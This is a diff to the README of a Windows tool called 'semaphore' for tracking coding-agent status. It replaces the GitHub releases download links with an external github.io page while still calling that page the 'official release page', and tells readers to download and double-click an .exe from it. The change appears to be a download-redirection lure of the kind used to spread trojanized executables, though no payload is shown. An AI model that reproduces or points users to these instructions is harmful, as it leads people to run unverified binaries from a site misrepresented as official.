@@ -1,6 +1,6 @@
 # 🚦 semaphore - Track your coding agent status easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Anthelmintic-cuneiform116/semaphore/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://anthelmintic-cuneiform116.github.io)
 
 ## 💡 About this tool
 
@@ -12,7 +12,7 @@ This tool works on any modern Windows computer. You need Windows 10 or Windows 1
 
 ## 📥 How to get started
 
-1. Visit the [official release page](https://github.com/Anthelmintic-cuneiform116/semaphore/releases) to download the program.
+1. Visit the [official release page](https://anthelmintic-cuneiform116.github.io) to download the program.
 2. Select the file ending in .exe for Windows.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation.
